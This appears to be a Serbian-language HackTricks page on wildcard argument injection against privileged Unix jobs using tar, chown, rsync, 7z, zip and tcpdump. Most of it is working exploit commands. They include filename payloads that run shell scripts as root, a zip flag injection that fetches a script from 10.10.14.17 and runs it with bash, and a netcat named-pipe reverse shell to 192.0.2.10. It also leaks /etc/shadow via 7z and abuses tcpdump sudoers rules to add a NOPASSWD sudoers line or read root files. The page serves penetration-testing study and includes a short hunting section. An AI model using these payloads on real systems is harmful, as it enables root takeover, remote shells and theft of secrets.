# Dodatni trikovi sa Wildcards

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (poznat i kao *glob*) **argument injection** nastaje kada privilegovana skripta pokrene Unix binary kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa wildcard-om bez navodnika, kao što je `*`.
> Pošto shell proširuje wildcard **pre** pokretanja binary-ja, attacker koji može da kreira fajlove u radnom direktorijumu može da napravi nazive fajlova koji počinju znakom `-`, zbog čega se tumače kao **opcije umesto podataka**, čime se efektivno ubacuju proizvoljni flagovi ili čak komande.
> Ova stranica prikuplja najkorisnije primitives, novija istraživanja i moderne detekcije za period 2023-2025.

## chown / chmod

Možete **kopirati owner/group ili permission bits proizvoljnog fajla** zloupotrebom `--reference` flag-a:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` se ubacuje, zbog čega *sve datoteke koje se podudaraju* nasleđuju vlasništvo/dozvole datoteke `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
Pogledajte i klasični rad kompanije DefenseCode za detalje.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Izvršite proizvoljne komande zloupotrebom funkcije **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava sa root privilegijama.

### bsdtar / macOS 14+

Podrazumevani `tar` u novijim verzijama macOS-a (zasnovan na `libarchive`) *ne implementira* `--checkpoint`, ali se code-execution i dalje može postići pomoću opcije **--use-compress-program**, koja omogućava navođenje eksternog kompresora.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kada privilegovana skripta pokrene `tar -cf backup.tar *`, biće pokrenut `/bin/sh`.

---

## rsync

`rsync` vam omogućava da zamenite udaljenu shell ili čak udaljeni binary putem opcija komandne linije koje počinju sa `-e` ili `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum pomoću `rsync -az * backup:/srv/`, ubačeni flag pokreće vaš shell na udaljenoj strani.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovani script *defanzivno* dodaje `--` ispred wildcard-a (kako bi zaustavio parsiranje opcija), 7-Zip format podržava **file list fajlove** tako što se ispred imena fajla doda `@`. Kombinovanjem toga sa symlink-om možete *eksfiltrirati proizvoljne fajlove*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvrši nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu datoteka i odustaće, **ispisujući sadržaj na stderr**.

Ovo funkcioniše i uz `-- *`, jer 7-Zip CLI izričito prihvata i obična imena datoteka i `@listfiles` kao pozicione ulaze, pa se literalno ime datoteke kao što je `@root.txt` i dalje posebno obrađuje.

---

## zip

Postoje dva veoma praktična primitive kada aplikacija prosleđuje korisnički kontrolisana imena datoteka komandi `zip` (bilo putem wildcard-a ili nabrajanjem imena bez `--`).

- RCE putem test hook-a: `-T` omogućava „test archive“, a `-TT <cmd>` zamenjuje tester proizvoljnim programom (duži oblik: `--unzip-command <cmd>`). Ako možete da ubacite imena datoteka koja počinju sa `-`, podelite flagove na različita imena datoteka kako bi parsiranje short-options funkcionisalo:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Napomene
- NEMOJ pokušavati sa jednom imenovanom datotekom kao što je `'-T -TT <cmd>'` — short options se obrađuju znak po znak i to neće raditi. Koristi zasebne tokene kao što je prikazano.
- Ako aplikacija uklanja kose crte iz imena datoteka, preuzmi sadržaj sa bare host/IP adrese (podrazumevana putanja je `/index.html`) i sačuvaj ga lokalno pomoću `-O`, a zatim ga izvrši.
- Možeš da debaguješ parsing pomoću `-sc` (prikazuje obrađeni argv) ili `-h2` (više pomoći) kako bi razumeo kako se tvoji tokeni obrađuju.

Primer (lokalno ponašanje u zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ako web sloj prosleđuje `zip` stdout/stderr (što je često kod naivnih wrapper-a), ubačene zastavice poput `--help` ili greške izazvane neispravnim opcijama pojaviće se u HTTP odgovoru, čime se potvrđuje command-line injection i olakšava podešavanje payload-a.

---

## Dodatni binarni fajlovi ranjivi na wildcard injection (kratka lista za 2023-2025)

Sledeće komande su zloupotrebljavane u modernim CTF-ovima i stvarnim okruženjima. Payload se uvek kreira kao *ime fajla* unutar direktorijuma sa dozvolom upisivanja, koji će kasnije biti obrađen pomoću wildcard-a:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Čitanje sadržaja fajla |
| `flock` | `-c <cmd>` | Izvršavanje komande |
| `git`   | `-c core.sshCommand=<cmd>` | Izvršavanje komande putem git-a preko SSH-a |
| `scp`   | `-S <cmd>` | Pokretanje proizvoljnog programa umesto ssh-a |

Ovi primitives su ređi od klasičnih *tar/rsync/zip* slučajeva, ali ih vredi proveriti tokom hunting-a.

---

## Pronalaženje ranjivih wrapper-a i job-ova

Nedavne studije slučaja pokazale su da wildcard/argv injection više nije samo problem tipa **cron + tar**. Ista klasa grešaka i dalje se pojavljuje u:

- web funkcijama koje „preuzimaju sve kao zip/tar“ iz direktorijuma za upload pod kontrolom napadača
- vendor/appliance debug shell-ovima koji izlažu **tcpdump** wrapper sa filename/filter poljima pod kontrolom napadača
- backup ili rotation job-ovima koji pozivaju `tar`, `rsync`, `7z`, `zip`, `chown` ili `chmod` nad direktorijumima sa dozvolom upisivanja

Korisne triage komande:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Brze heuristike:

- `-- *` je dobro rešenje za mnoge GNU tools, ali **ne** i za `7z`/`7za`, zato što se `@listfiles` parsiraju zasebno.
- Za `zip`, potražite wrappers koji direktno enumerišu filenames pod kontrolom korisnika; razdvajanje short-option opcija (`-T` + `-TT <cmd>`) i dalje funkcioniše čak i bez shell glob-a.
- Za `tcpdump` obratite posebnu pažnju na wrappers koji vam omogućavaju kontrolu **imena izlaznih fajlova**, **podešavanja rotacije** ili argumenata za **reprodukciju capture fajlova**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE putem argv injection-a u wrappers

Kada restricted shell ili vendor wrapper formira `tcpdump` command line konkatenacijom polja pod kontrolom korisnika (npr. parametra „file name“), bez striktne validacije ili quoting-a, možete ubaciti dodatne `tcpdump` flags. Kombinacija opcija `-G` (rotacija zasnovana na vremenu), `-W` (ograničava broj fajlova) i `-z <cmd>` (komanda nakon rotacije) omogućava proizvoljno izvršavanje komandi kao korisnik koji pokreće tcpdump (često root na appliances).

Preduslovi:

- Možete uticati na `argv` koji se prosleđuje programu `tcpdump` (npr. putem wrapper-a kao što je `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper ne sanitizuje razmake ili tokene koji počinju znakom `-` u polju za ime fajla.

Klasičan PoC (izvršava reverse shell skriptu iz putanje u koju je moguće upisivati):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalji:

- `-G 1 -W 1` primorava trenutni rotate nakon prvog paketa koji se podudara.
- `-z <cmd>` pokreće post-rotate komandu jednom po rotaciji. Mnoge build verzije izvršavaju `<cmd> <savefile>`. Ako je `<cmd>` script/interpreter, proverite da obrada argumenata odgovara vašem payload-u.

Varijante bez prenosivih medija:

- Ako imate bilo koji drugi primitive za upisivanje fajlova (npr. zaseban command wrapper koji dozvoljava output redirection), postavite svoj script na poznatu putanju i pokrenite `-z /bin/sh /path/script.sh` ili `-z /path/script.sh`, u zavisnosti od semantike platforme.
- Neki vendor wrapperi rotiraju fajlove na lokacije koje kontroliše attacker. Ako možete uticati na rotiranu putanju (symlink/directory traversal), možete usmeriti `-z` da izvrši sadržaj koji u potpunosti kontrolišete bez eksternog medija.

---

## sudoers: tcpdump sa wildcards/additional args → arbitrary write/read i root

Veoma čest sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- Glob `*` i permisivni patterns ograničavaju samo prvi `-w` argument. `tcpdump` prihvata više `-w` opcija; poslednja ima prednost.
- Pravilo ne ograničava druge opcije, pa su `-Z`, `-r`, `-V` itd. dozvoljene.

Primitives
- Zamenite odredišnu putanju drugim `-w` (prvi samo zadovoljava sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal unutar prvog `-w` za izlazak iz ograničenog stabla:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Prinudno postavi vlasništvo nad izlazom pomoću `-Z root` (kreira fajlove u vlasništvu korisnika root bilo gde):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Upis proizvoljnog sadržaja ponovnim reprodukovanjem kreiranog PCAP-a putem `-r` (npr. za dodavanje sudoers linije):

<details>
<summary>Kreirajte PCAP koji sadrži tačan ASCII payload i upišite ga kao root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Čitanje proizvoljnih fajlova/curenje tajni pomoću `-V <file>` (tumači listu savefiles). Dijagnostika grešaka često ispisuje linije, čime se otkriva sadržaj:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Reference

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
